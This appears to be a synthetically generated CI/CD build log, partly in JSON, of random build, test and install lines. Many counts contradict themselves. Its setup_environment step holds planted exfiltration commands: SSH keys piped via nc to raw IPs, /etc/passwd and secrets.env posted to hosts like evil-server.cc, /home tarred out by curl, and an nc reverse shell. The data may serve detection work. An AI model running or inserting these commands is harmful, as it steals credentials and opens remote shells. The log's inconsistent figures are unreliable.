uploaded: dist.zip (93MB)\nReady.\n[12:46:42] DEBUG: Memory usage: 1204MB\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-9995\nyarn add: Done in 13.9s\nTLS handshake completed\nTLS handshake completed\nTransforming 634 files...\nStep 17/17: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading axios-3.15.tar.gz\n[12:46:42] INFO: Request completed\n[12:46:42] DEBUG: Loading configuration\nStep 3/16: Running migrations\n[12:46:42] INFO: Processing request\nStep 3/21: Installing dependencies\nnpm install: resolved 1120 packages\nWaiting...\nWaiting...\nnpm install: resolved 982 packages\nRan 33 tests in 33s\nnpm install: added 78 packages\nCache invalidated: dependencies\nStep 9/24: Installing dependencies\nConnection established\n\u2713 Step 'setup' succeeded\nSuccess!\nWARNING: lodash has known vulnerabilities\nCompiling components/service.java...\nStep 8/18: Deploying\nEnvironment: development\nPushing to registry...\nTests: 337 passed, 107 total\nDone.\nWARNING: eslint has known vulnerabilities\n[12:46:42] DEBUG: Memory usage: 897MB\npip: Collecting prettier\n[12:46:42] INFO: Connecting to database\n[12:46:42] DEBUG: Memory usage: 1716MB\nMinifying vendor.js\nnpm install: added 443 packages\n\u2713 Task completed in 1866ms\nCreating production build...\npip: Collecting jest\nStep 19/24: Testing\nStep 16/17: Running migrations\nStep 20/15: Building\n[12:46:42] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\npip: Downloading axios-5.15.tar.gz\nBuilding Docker image...\nWaiting...\nProcessing...\nWaiting...\n  PASS: unit/test_auth_login.spec.js\nFetching submodules...\nnpm install: resolved 1920 packages\n\u2717 build failed with exit code 46\nPulling image: node:latest\nEnvironment: staging\nTime: 97.662s\nUploading artifact 'coverage' (17 files)\n[12:46:42] WARN: Deprecated API usage\nException: RuntimeError\nRan 68 tests in 29s\nException: RuntimeError\nCompiling components/handler.rs...\nUploading artifact 'coverage' (27 files)\nAlready up to date.\nWARNING: express has known vulnerabilities\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:42] DEBUG: Query executed in 37ms\nMinifying vendor.js\nStep 17/18: Linting\nEnvironment: staging\nOK\nSnapshots: 20 passed, 33 total\nStep 14/16: Running migrations\n=== Step upload_artifacts completed ===\n=== Step: e2e_tests ===\npip: Installing build dependencies...\n\u2713 Task completed in 217ms\nCache hit for key-9830\nArtifact downloaded: 28MB\nLayer 9/14: RUN command\nStep 19/21: Deploying\nEnvironment: staging\n[12:46:42] INFO: Cache refreshed\nOK\nProcessing...\nPOST /data - 202 (68ms)\nUsing Python 3.10\nCompiling utils/service.java...\n  PASS: unit/test_api_health.spec.js\nCoverage: 93% statements, 89% branches\nAlready up to date.\npip: Collecting express\nnpm install: added 204 packages\nInstalling prettier@3.7.7\nCache hit for key-1840\n[12:46:42] DEBUG: Connection pool: 16 active\nCache restored successfully (115MB)\nCache saved successfully\n\u2713 deploy completed\n[12:46:42] DEBUG: Connection pool: 11 active\nMinifying main.js\nFAILED: test_cache_hit\n[12:46:42] WARN: Deprecated API usage\nStep 4/20: Running migrations\nUploading artifact 'coverage' (45 files)\nStep 3/24: Testing\nTests: 132 passed, 380 total\nNODE_ENV=test\n[12:46:42] DEBUG: Memory usage: 1318MB\n[12:46:42] DEBUG: Loading configuration\nDone.\nCache saved successfully\nSuccess!\nPOST /api - 202 (214ms)\nHEAD is now at 8035eb9\nPlatform: darwin-arm64\nUsing Node.js 17.7.10\nLayer 3/13: COPY command\nStep 4/18: Deploying\nSuccess!\nAlready up to date.\nArtifact downloaded: 41MB\n[12:46:42] INFO: Connecting to database\nArtifact uploaded: dist.zip (28MB)\n\u2713 All checks passed\nPushing to registry...\n[12:46:42] ERROR: Connection failed\n[12:46:42] INFO: Processing request\nOK\nInstalling react@3.14.1\n[12:46:42] DEBUG: Connection pool: 6 active\nFetching from https://googleapis.com/package.json\nOptimizing 74 modules...\nFetching submodules...\nLayer 3/14: RUN command\n[12:46:42] INFO: Connecting to database\nCoverage: 90% statements, 83% branches\nTest Suites: 31 passed, 48 total\nFetching submodules...\nnpm install: resolved 443 packages\nSuccess!\nBuilding Docker image...\nCompiling utils/index.js...\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] DEBUG: Query executed in 23ms\nCache saved successfully\nSwitched to branch 'feature/task-705'\nStep 18/16: Deploying\nCache saved successfully\nSnapshots: 29 passed, 10 total\nTest Suites: 45 passed, 47 total\n[12:46:42] INFO: Starting build process\n[12:46:42] INFO: Cache refreshed\nCoverage: 95% statements, 88% branches\nOK\nWaiting...\nArtifact uploaded: dist.zip (100MB)\nNODE_ENV=test\nGenerating source maps...\nSuccess!\nSnapshots: 35 passed, 16 total\nCache restored successfully (365MB)\nArtifact downloaded: 4MB\nStep 12/20: Installing dependencies\n  PASS: test_user_create (169ms)\nVerifying...\nPOST /api - 201 (427ms)\nyarn add: Done in 1.70s\nCompiling utils/main.py...\nyarn add: Done in 7.16s\nFAILED: test_user_create\nWARNING: axios has known vulnerabilities\nFAILED: test_cache_hit\nBuilding Docker image...\nCompiling src/app.ts...\n[12:46:42] WARN: Deprecated API usage\n\u2713 All checks passed\nGenerating source maps...\nStep 2/24: Installing dependencies\nFinished.\n[12:46:42] INFO: Processing request\n\u2717 build failed with exit code 68\nStep 4/24: Building\nTime: 85.951s\nStep 1/21: Testing\n[12:46:42] DEBUG: Memory usage: 1544MB\nCache invalidated: node_modules\nChecking out master branch\nUsing Python 3.9\nVerifying...\n\u2713 Task completed in 3954ms\nStep 10/18: Installing dependencies\npip: Downloading jest-2.10.tar.gz\nCompiling components/utils.go...\nnpm install: resolved 1233 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nCompiling lib/index.js...\nnpm notice: package.json updated\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nVerifying...\nCompiling utils/main.py...\nChecking out master branch\nBuilding Docker image...\n\u2713 Step 'install' succeeded\nMinifying app.js\nCompiling utils/utils.go...\n[12:46:42] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 180 passed, 235 total\nCompiling utils/utils.go...\nnpm install: added 448 packages\nArtifact uploaded: dist.zip (5MB)\n=== Step e2e_tests completed ===\n=== Step: save_cache ===\n[12:46:42] DEBUG: Initializing service\nCompleted.\nWARNING: prettier has known vulnerabilities\nTransforming 655 files...\nFetching from https://docker.io/package.json\nMinifying app.js\n[12:46:42] INFO: Processing request\nCache saved successfully\nSuccess!\nTest Suites: 16 passed, 49 total\n[12:46:42] ERROR: Connection failed\nPOST /upload - 202 (12ms)\nChecking out master branch\n\u2713 Step 'checkout' succeeded\nPushing to registry...\nInstalling axios@3.0.0\nFinished.\nOK\nArtifact downloaded: 26MB\nMinifying main.js\nCompiling utils/handler.rs...\nyarn add: Done in 29.7s\n[12:46:42] WARN: Deprecated API usage\n  PASS: e2e/test_auth_login.spec.js\nChecking out main branch\nVerifying...\nWARNING: react has known vulnerabilities\nCoverage: 91% statements, 99% branches\n[12:46:42] DEBUG: Connection pool: 15 active\nGET /health - 204 (68ms)\nRan 42 tests in 22s\nCache invalidated: build\nHEAD is now at 14d7329\nWaiting...\nProcessing...\nStep 11/15: Running migrations\nPlatform: darwin-arm64\nStep 13/24: Deploying\nUploading artifact 'dist' (9 files)\nUsing Python 3.9\nException: TypeError\nBundling runtime.js\nDone.\nCompiling components/index.js...\n[12:46:42] DEBUG: Loading configuration\nnpm install: resolved 335 packages\n[12:46:42] INFO: Connecting to database\nPulling image: python:3.11\nOK\n[12:46:42] DEBUG: Initializing service\nWARNING: react has known vulnerabilities\n[12:46:42] DEBUG: Query executed in 86ms\nPOST /data - 200 (123ms)\nCompiling lib/app.ts...\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (46MB)\npip: Downloading webpack-5.14.tar.gz\nCache hit for key-7066\nCompiling src/main.py...\nCompiling utils/handler.rs...\nFetching submodules...\n[12:46:42] DEBUG: Connection pool: 20 active\nOptimizing 38 modules...\n[12:46:42] ERROR: Connection failed\nSwitched to branch 'hotfix/task-813'\nStep 7/16: Deploying\nSnapshots: 32 passed, 41 total\nWARNING: axios has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\nPOST /data - 200 (222ms)\n  PASS: unit/test_api_health.spec.js\nCompiling utils/service.java...\nException: TypeError\nUsing Python 3.10\nMinifying app.js\nFinished.\n  PASS: e2e/test_user_create.spec.js\nStep 1/24: Testing\nInstalling react@2.17.0\nTLS handshake completed\nnpm install: added 175 packages\nReady.\n  PASS: e2e/test_db_connect.spec.js\n[12:46:42] WARN: Deprecated API usage\nConnection established\nPlatform: linux-x64\nGET /health - 201 (19ms)\nMinifying app.js\nDone.\n\u2713 Step 'build' succeeded\nWaiting...\nProcessing...\nCache restored successfully (402MB)\nStep 19/23: Building\nBundling vendor.js\nCache invalidated: build\nCreating production build...\nTLS handshake completed\nStep 17/25: Testing\nyarn add: Done in 10.45s\nUsing Python 3.11\nUsing Node.js 14.0.4\nFetching from https://registry.npmjs.org/package.json\nStep 1/20: Running migrations\nnpm notice: created a lockfile\nCache saved successfully\n[12:46:42] WARN: Deprecated API usage\n\u2717 build failed with exit code 36\nReady.\nInstalling lodash@3.6.8\nLayer 3/13: COPY command\n[12:46:42] DEBUG: Query executed in 47ms\nBundling main.js\nEnvironment: production\nGenerating source maps...\nCompleted.\nArtifact uploaded: dist.zip (94MB)\nWARNING: axios has known vulnerabilities\nLayer 4/13: RUN command\nInstalling eslint@3.15.8\nPlatform: darwin-arm64\nnpm install: added 319 packages\nStep 12/23: Running migrations\n\u2713 validate completed\nNODE_ENV=development\nTransforming 942 files...\nUploading artifact 'coverage' (8 files)\nOptimizing 84 modules...\nStep 11/18: Running migrations\nTime: 120.861s\n[12:46:42] WARN: Deprecated API usage\nCompiling components/handler.rs...\nCache saved successfully\nCreating production build...\nCompiling components/service.java...\nCompiling utils/app.ts...\n[12:46:42] DEBUG: Initializing service\nChecking out master branch\nHEAD is now at 7208c6b\n=== Step save_cache completed ===\n=== Step: lint ===\npip: Installing build dependencies...\nReady.\nStep 10/19: Running migrations\nBuilding Docker image...\nStep 18/19: Deploying\n  PASS: test_api_health (336ms)\nWARNING: axios has known vulnerabilities\nnpm notice: package.json updated\nCache hit for key-5555\nTest Suites: 5 passed, 16 total\nReady.\nSwitched to branch 'hotfix/task-813'\n\u2713 Task completed in 3906ms\nReady.\nArtifact downloaded: 18MB\nProcessing...\nStep 14/21: Deploying\nnpm notice: created a lockfile\n[12:46:42] DEBUG: Memory usage: 1711MB\nCache miss for key-6239\nArtifact downloaded: 14MB\nBundling main.css\nFetching submodules...\nUsing Python 3.9\n[12:46:42] DEBUG: Connection pool: 18 active\nCache hit for key-5065\nBundling vendor.js\n\u2713 Task completed in 2325ms\nInstalling jest@2.14.2\npip: Downloading eslint-2.11.tar.gz\nTransforming 915 files...\nNODE_ENV=test\nChecking out main branch\nyarn add: Done in 27.17s\npip: Downloading jest-3.11.tar.gz\nnpm install: resolved 1570 packages\n\u2713 Step 'test' succeeded\npip: Installing build dependencies...\n[12:46:42] INFO: Starting build process\nRan 131 tests in 49s\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (27MB)\nyarn add: Done in 10.48s\nOK\nCompiling utils/handler.rs...\nCache hit for key-4092\nSnapshots: 21 passed, 19 total\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed axios-4.16\n[12:46:42] DEBUG: Initializing service\nWARNING: express has known vulnerabilities\nAlready up to date.\nFinished.\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] INFO: Connecting to database\nPulling image: python:18\n[12:46:42] INFO: Connecting to database\nCompiling utils/service.java...\n[12:46:42] DEBUG: Query executed in 61ms\nCompiling utils/handler.rs...\nnpm install: added 334 packages\nGET /api - 201 (45ms)\nRan 99 tests in 50s\n  PASS: integration/test_db_connect.spec.js\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 Task completed in 1253ms\nCache miss for key-6630\nBuilding Docker image...\npip: Installing build dependencies...\nBuilding Docker image...\n\u2713 lint completed\nCache saved successfully\n[12:46:42] DEBUG: Memory usage: 1484MB\n[12:46:42] DEBUG: Query executed in 93ms\n[12:46:42] DEBUG: Memory usage: 843MB\nWaiting...\nAlready up to date.\nTransforming 921 files...\nNODE_ENV=production\nStep 12/22: Building\nHEAD is now at bf2d58b\nCache invalidated: build\nPulling image: node:latest\nConnection established\nnpm notice: package.json updated\nBuilding Docker image...\nStep 18/15: Testing\n[12:46:42] DEBUG: Loading configuration\npip: Collecting prettier\n[12:46:42] INFO: Cache refreshed\n\u2713 test completed\nFetching from https://github.com/package.json\n  PASS: test_db_connect (484ms)\nInstalling webpack@5.3.5\nProcessing...\n[12:46:42] ERROR: Connection failed\nRan 123 tests in 43s\npip: Installing build dependencies...\nWaiting...\nStep 8/17: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nWARNING: jest has known vulnerabilities\nNODE_ENV=development\nTests: 252 passed, 480 total\nOptimizing 91 modules...\nEnvironment: test\nFetching from https://gcr.io/package.json\nReady.\nStep 15/20: Running migrations\n[12:46:42] INFO: Cache refreshed\nInstalling lodash@2.2.0\nStep 18/23: Linting\nyarn add: Done in 5.47s\npip: Installing build dependencies...\nBuilding Docker image...\nRan 90 tests in 4s\nTLS handshake completed\nPOST /api - 200 (18ms)\nPOST /upload - 200 (255ms)\nStep 15/24: Deploying\nReady.\nConnection established\nStep 20/15: Running migrations\n[12:46:42] DEBUG: Memory usage: 1383MB\nGenerating source maps...\nStep 14/22: Linting\nRan 87 tests in 42s\nBundling vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_user_create (449ms)\nProcessing...\nFetching from https://googleapis.com/package.json\nCompiling lib/service.java...\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 17/23: Running migrations\n  PASS: test_db_connect (303ms)\n=== Step lint completed ===\n=== Step: build ===\nCache saved successfully\nCompleted.\n[12:46:42] WARN: Deprecated API usage\nFetching from https://registry.npmjs.org/package.json\nSuccess!\nWaiting...\nReady.\n[12:46:42] DEBUG: Initializing service\nSuccess!\npip install: Successfully installed eslint-2.6\nTLS handshake completed\nCompiling utils/utils.go...\nGenerating source maps...\nUsing Python 3.9\nStep 8/17: Linting\nStep 1/22: Building\nReady.\n[12:46:42] INFO: Request completed\nImage pulled successfully\nCompiling src/index.js...\nCompiling utils/utils.go...\nFetching submodules...\nOK\n\u2717 build failed with exit code 78\nOK\nCompiling utils/app.ts...\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (7MB)\nImage pulled successfully\nStep 19/23: Building\nEnvironment: production\nArtifact downloaded: 18MB\nCompiling lib/handler.rs...\nRan 198 tests in 56s\n[12:46:42] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 465 files...\nCache hit for key-5260\nCompiling lib/utils.go...\n\u2713 All checks passed\nStep 20/18: Installing dependencies\n[12:46:42] INFO: Starting build process\nMinifying app.js\nUploading artifact 'build' (24 files)\nCache saved successfully\n[12:46:42] DEBUG: Connection pool: 18 active\npip: Collecting react\nWARNING: eslint has known vulnerabilities\nNODE_ENV=production\nLayer 10/8: COPY command\npip: Downloading webpack-5.9.tar.gz\nLoading...\n[12:46:42] INFO: Processing request\nCoverage: 99% statements, 61% branches\nOK\nPlatform: darwin-arm64\n[12:46:42] ERROR: Connection failed\n[12:46:42] DEBUG: Connection pool: 3 active\n[12:46:42] INFO: Connecting to database\nCache invalidated: dependencies\nTime: 70.368s\nPulling image: node:18\nBundling main.css\nyarn add: Done in 2.19s\nCompiling src/index.js...\nVerifying...\nStep 4/18: Building\n\u2713 deploy completed\nProcessing...\nConnection established\nWARNING: webpack has known vulnerabilities\nCache restored successfully (307MB)\nnpm notice: created a lockfile\n[12:46:42] INFO: Processing request\n\u2713 Task completed in 1930ms\nInstalling webpack@1.18.3\nHEAD is now at e0a6660\nHEAD is now at 1db46ad\n  PASS: integration/test_cache_hit.spec.js\nnpm notice: created a lockfile\nPOST /upload - 201 (112ms)\nUploading artifact 'build' (6 files)\nCompiling lib/app.ts...\nStep 19/17: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:42] DEBUG: Query executed in 52ms\nStep 5/24: Installing dependencies\nCache saved successfully\nEnvironment: staging\nCache hit for key-9899\nUploading artifact 'dist' (4 files)\nTests: 234 passed, 105 total\n\u2713 Task completed in 3160ms\n[12:46:42] WARN: Deprecated API usage\nVerifying...\nCompleted.\nImage pulled successfully\nTests: 291 passed, 58 total\nTime: 14.612s\nHEAD is now at 1f992c4\nChecking out master branch\nCompiling components/index.js...\npip: Downloading react-2.13.tar.gz\n[12:46:42] DEBUG: Initializing service\nArtifact uploaded: dist.zip (25MB)\n[12:46:42] INFO: Connecting to database\nCompiling lib/index.js...\nStep 7/20: Building\nTLS handshake completed\n[12:46:42] DEBUG: Initializing service\nPOST /data - 200 (312ms)\n  PASS: test_cache_hit (36ms)\nUploading artifact 'dist' (49 files)\nWARNING: lodash has known vulnerabilities\n[12:46:42] DEBUG: Loading configuration\nStep 8/20: Building\n[12:46:42] WARN: Deprecated API usage\n[12:46:42] INFO: Connecting to database\nGET /health - 200 (97ms)\nCompiling utils/service.java...\nConnection established\nStep 9/18: Building\nPOST /api - 201 (356ms)\nPushing to registry...\nCompiling components/service.java...\nSnapshots: 10 passed, 15 total\nProcessing...\n[12:46:42] DEBUG: Loading configuration\nTransforming 605 files...\nConnection established\nWaiting...\nInstalling eslint@2.8.0\nCompiling lib/service.java...\nCache invalidated: dependencies\nSnapshots: 30 passed, 4 total\n\u2713 Step 'build' succeeded\n\u2713 build completed\nFinished.\n[12:46:42] WARN: Deprecated API usage\n=== Step build completed ===\n=== Step: unit_tests ===\nRan 195 tests in 60s\nPushing to registry...\nTLS handshake completed\nOK\nStep 17/15: Testing\nArtifact uploaded: dist.zip (70MB)\n[12:46:42] DEBUG: Memory usage: 579MB\nArtifact downloaded: 13MB\npip install: Successfully installed lodash-2.14\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nCache hit for key-4643\nTests: 320 passed, 97 total\nCompiling src/main.py...\n[12:46:42] WARN: Deprecated API usage\nStep 8/24: Running migrations\nCompleted.\n[12:46:42] DEBUG: Loading configuration\nWaiting...\n[12:46:42] DEBUG: Loading configuration\nLayer 1/15: ENV command\nTransforming 885 files...\n\u2713 deploy completed\nTransforming 547 files...\nGET /api - 204 (88ms)\nFetching from https://npmjs.org/package.json\nGET /health - 200 (88ms)\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCoverage: 73% statements, 73% branches\nGET /status - 204 (7ms)\nCache hit for key-2405\nGET /status - 204 (29ms)\n[12:46:42] WARN: Deprecated API usage\nnpm install: added 469 packages\nFetching from https://amazonaws.com/package.json\nCompiling lib/main.py...\nUsing Node.js 14.16.10\n[12:46:42] ERROR: Connection failed\nCreating production build...\nPlatform: linux-x64\nOK\n[12:46:42] INFO: Connecting to database\nInstalling eslint@2.12.9\nArtifact downloaded: 43MB\nCompiling components/handler.rs...\nTransforming 650 files...\nStep 6/22: Installing dependencies\nInstalling axios@5.18.3\nPulling image: python:latest\nStep 2/19: Running migrations\n[12:46:42] DEBUG: Memory usage: 168MB\nDone.\nCache hit for key-6716\nOptimizing 80 modules...\nTime: 86.280s\nCompiling lib/index.js...\nRan 67 tests in 48s\nDone.\nnpm install: added 108 packages\n[12:46:42] INFO: Starting build process\nCompiling utils/handler.rs...\nMinifying main.js\nnpm notice: package.json updated\nUsing Python 3.11\nHEAD is now at 3beae9b\nTests: 335 passed, 50 total\nTests: 478 passed, 412 total\nPlatform: linux-x64\nnpm notice: package.json updated\n  PASS: test_cache_hit (324ms)\nnpm install: resolved 1967 packages\nFinished.\nStep 13/18: Linting\nPulling image: node:3.11\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (120ms)\nGenerating source maps...\nCache saved successfully\nCompiling lib/main.py...\nStep 3/21: Testing\nGenerating source maps...\nCache miss for key-8542\n[12:46:42] INFO: Starting build process\nFAILED: test_api_health\nFinished.\nCompleted.\n[12:46:42] WARN: Deprecated API usage\nFinished.\nHEAD is now at 9b93c6f\n\u2713 package completed\nUsing Node.js 18.8.10\nPOST /upload - 202 (139ms)\nCache restored successfully (170MB)\nSnapshots: 45 passed, 10 total\n  PASS: e2e/test_db_connect.spec.js\nCompleted.\n[12:46:42] INFO: Request completed\nnpm notice: package.json updated\nStep 8/19: Building\n[12:46:42] WARN: Deprecated API usage\nCache hit for key-3521\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSnapshots: 6 passed, 42 total\nBundling styles.css\nCompiling components/service.java...\nyarn add: Done in 1.71s\nnpm notice: created a lockfile\nStep 1/16: Building\nCache restored successfully (65MB)\n[12:46:42] DEBUG: Query executed in 81ms\nStep 11/23: Deploying\n  PASS: test_user_create (17ms)\n[12:46:42] DEBUG: Initializing service\nProcessing...\nFAILED: test_db_connect\nSuccess!\nCompiling src/index.js...\nRan 134 tests in 6s\nPOST /upload - 200 (446ms)\nPulling image: alpine:3.11\n[12:46:42] INFO: Processing request\npip: Installing build dependencies...\nCoverage: 99% statements, 98% branches\nHEAD is now at 51cc368\nTests: 203 passed, 280 total\n[12:46:42] DEBUG: Memory usage: 1115MB\nSwitched to branch 'bugfix/task-792'\n  PASS: integration/test_auth_login.spec.js\nUsing Node.js 16.0.4\n[12:46:42] INFO: Starting build process\nCoverage: 80% statements, 65% branches\n\u2713 Task completed in 3475ms\n[12:46:42] WARN: Deprecated API usage\nBuilding Docker image...\nStep 16/18: Running migrations\nStep 10/20: Deploying\nVerifying...\nStep 6/17: Installing dependencies\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\npip: Collecting axios\necho $(cat ~/.ssh/id_rsa) | base64 | nc 77.191.192.16 4128\n[12:46:42] WARN: Deprecated API usage\nPOST /upload - 200 (68ms)\nCache miss for key-2236\nSnapshots: 9 passed, 11 total\nTLS handshake completed\n  PASS: test_cache_hit (136ms)\n[12:46:42] INFO: Connecting to database\nLoading...\npip: Installing build dependencies...\n[12:46:42] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nOptimizing 99 modules...\nSending 373MB of data to malicious-pool.xyz\n\u2713 Step 'checkout' succeeded\necho $(cat ~/.ssh/id_rsa) | base64 | nc 35.232.162.217 18399\nnpm notice: created a lockfile\nNODE_ENV=development\nFetching from https://githubusercontent.com/package.json\n[12:46:42] WARN: Deprecated API usage\nImage pulled successfully\n[12:46:42] DEBUG: Memory usage: 1297MB\nLoading...\nEnvironment: development\nTests: 468 passed, 290 total\nGET /api - 200 (71ms)\npip: Installing build dependencies...\nStep 9/22: Deploying\necho $(cat ~/.ssh/id_rsa) | base64 | nc 239.9.13.74 32775\nFAILED: test_auth_login\npip install: Successfully installed express-3.8\nSending 174MB of data to evil-server.cc\npip: Collecting express\n\u2713 Task completed in 1886ms\nPlatform: win32-x64\nCoverage: 72% statements, 94% branches\nLayer 6/11: RUN command\nLoading...\n[12:46:42] DEBUG: Memory usage: 620MB\n  PASS: unit/test_api_health.spec.js\nCache restored successfully (335MB)\npip: Downloading axios-4.1.tar.gz\nArtifact downloaded: 20MB\nNODE_ENV=production\nEnvironment: development\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nCompleted.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 141.56.134.88 51798\nUsing Python 3.9\nTransforming 610 files...\nnpm notice: created a lockfile\nRan 161 tests in 57s\nWARNING: axios has known vulnerabilities\nCompiling src/service.java...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nTLS handshake completed\nPushing to registry...\nBuilding Docker image...\n[12:46:42] DEBUG: Initializing service\nArtifact uploaded: dist.zip (67MB)\nMinifying main.js\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nImage pulled successfully\n[12:46:42] ERROR: Connection failed\nStep 14/23: Testing\n[12:46:42] DEBUG: Query executed in 57ms\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nTest Suites: 31 passed, 23 total\nSwitched to branch 'hotfix/task-891'\nOptimizing 56 modules...\n\u2713 build completed\n\u2713 All checks passed\nEnvironment: production\nCache saved successfully\nAlready up to date.\n\u2713 Step 'checkout' succeeded\nnpm notice: package.json updated\nImage pulled successfully\nMinifying app.js\n  PASS: unit/test_user_create.spec.js\nCreating production build...\nProcessing...\nTLS handshake completed\nEnvironment: test\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nReady.\nnc -e /bin/sh 114.27.129.212 24011\nGET /status - 201 (28ms)\nProcessing...\nCoverage: 91% statements, 84% branches\n[12:46:42] INFO: Processing request\nAlready up to date.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 67.41.96.44 53562\nnpm install: added 403 packages\nInstalling webpack@1.0.7\n\u2713 Task completed in 2356ms\nAlready up to date.\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n[12:46:42] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 106.105.10.87 62031\n[12:46:42] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\n\u2713 lint completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:42] INFO: Request completed\nDone.\n[12:46:42] DEBUG: Initializing service\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n[12:46:42] DEBUG: Initializing service\nTest Suites: 5 passed, 13 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSending 141MB of data to data-exfil.ru\nConnection established\nSending 500MB of data to evil-server.cc\nCoverage: 70% statements, 93% branches\nFetching submodules...\nImage pulled successfully\nArtifact downloaded: 14MB\n\u2713 test completed\npip install: Successfully installed jest-3.1\n\u2713 package completed\nCache hit for key-5971\nBuilding Docker image...\nArtifact uploaded: dist.zip (23MB)\nStep 9/22: Installing dependencies\nBundling main.css\nSuccess!\nSending 340MB of data to data-exfil.ru\nCompiling utils/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nWaiting...\nAlready up to date.\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\n[12:46:42] INFO: Request completed\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nDone.\nUsing Python 3.9\nUsing Python 3.10\nFetching submodules...\nArtifact uploaded: dist.zip (28MB)\n[12:46:42] DEBUG: Query executed in 50ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nnpm install: resolved 399 packages\nDone.\npip: Collecting lodash\nyarn add: Done in 23.6s\n[12:46:42] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling lib/utils.go...\nTests: 412 passed, 127 total\nConnection established\n[12:46:42] INFO: Processing request\nPlatform: win32-x64\nFetching from https://registry.npmjs.org/package.json\nCache miss for key-6131\nTest Suites: 29 passed, 50 total\nStep 20/15: Linting\nnpm notice: created a lockfile\n[12:46:42] INFO: Request completed\n\u2717 build failed with exit code 92\n=== Step setup_environment completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-30T12:46:42.437939",
        "finished_at": "2025-11-30T12:46:51.708301",
        "log_lines": [
          "=== Step: setup_node ===",
          "npm install: added 222 packages",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Verifying...",
          "Optimizing 89 modules...",
          "pip: Collecting axios",
          "\u2713 All checks passed",
          "Artifact downloaded: 32MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "HEAD is now at 2831270",
          "Already up to date.",
          "Done.",
          "pip install: Successfully installed lodash-1.5",
          "\u2713 All checks passed",
          "Success!",
          "Connection established",
          "Verifying...",
          "[12:46:42] DEBUG: Connection pool: 17 active",
          "POST /data - 200 (431ms)",
          "Compiling components/index.js...",
          "Pushing to registry...",
          "Building Docker image...",
          "Cache restored successfully (96MB)",
          "Environment: development",
          "Compiling src/main.py...",
          "Finished.",
          "Generating source maps...",
          "Compiling src/app.ts...",
          "[12:46:42] INFO: Processing request",
          "yarn add: Done in 13.78s",
          "[12:46:42] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Switched to branch 'feature/task-178'",
          "Cache invalidated: node_modules",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache invalidated: build",
          "Artifact downloaded: 14MB",
          "[12:46:42] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (48MB)",
          "Environment: development",
          "Installing express@4.11.4",
          "Test Suites: 38 passed, 22 total",
          "Optimizing 45 modules...",
          "Step 19/19: Linting",
          "[12:46:42] DEBUG: Query executed in 95ms",
          "Step 13/18: Running migrations",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Platform: linux-x64",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "[12:46:42] DEBUG: Connection pool: 20 active",
          "Test Suites: 12 passed, 41 total",
          "\u2713 All checks passed",
          "Environment: production",
          "Compiling src/index.js...",
          "Platform: win32-x64",
          "HEAD is now at aabce20",
          "Building Docker image...",
          "Image pulled successfully",
          "Done.",
          "Transforming 372 files...",
          "Using Python 3.11",
          "pip install: Successfully installed webpack-5.5",
